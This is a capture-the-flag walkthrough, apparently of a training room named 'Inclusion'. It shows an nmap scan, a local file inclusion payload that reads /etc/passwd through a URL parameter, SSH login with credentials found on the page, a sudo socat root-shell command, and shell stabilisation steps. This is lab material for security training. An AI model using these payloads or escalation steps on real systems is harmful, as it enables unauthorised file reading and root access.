# Inclusion

## nmap scan

nmap -sC -sV -A -oN ./nmap/initial -v IP

open ports:
>			22 SSH
>			80 HTTP

# Task 2

## perform local file inclusion attack
	
1. since we know a local file inclusion is possible (due to the rooms entire theme being lfi) we are going to check common files such as /etc/passwd

	1. we do this by changing the name variable in the url to the desired location e.g from
	
	`http://10.10.54.151/article?name=lfiattack` to `http://10.10.54.151/article?name=../../../etc/passwd` 

	we could also do the same with any file we wish to access, even the root and user flags

base url -> `http://10.10.174.11/article?name=lfiattack`

there is a username and password set commented out, use the credentials to ssh onto the machine, as we noted with the nmap scan earlier ssh is open

2. ssh falconfeast@IP

`enter the password found when prompted`

3. run the following commands to get the user flag
```
	ls -la (to display all files)
	cat user.txt (as we now know user.txt is in current directory)
```


3. using sudo -l we find that we can run socat as root, use gtfobins to get a root shell
```
	Matching Defaults entries for falconfeast on inclusion:
    	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User falconfeast may run the following commands on inclusion:
    	(root) NOPASSWD: /usr/bin/socat
```
	1. go to the gtfobins site and search socat, we find the command to use with sudo we run it and we get a root shell
```
	sudo /usr/bin/socat stdin exec:/bin/sh
```

4. run the following commands to find the root flag
```
find / -type f -name "root.txt" 2>/dev/null 
cat root/root.txt
```

# OPTIONAL
if you want to you could stabilise your shell here, i reccomend doing this if you are new as it is useful to know how to do
 
1. which python3 (used to chek if python is on the box)

2. python3 -c 'import pty;pty.spawn("/bin/bash")'

3. export TERM=xterm

4. ctrl-z (backgrounds the shell)

5. stty raw -echo; fg

you will now have a fully functional shell
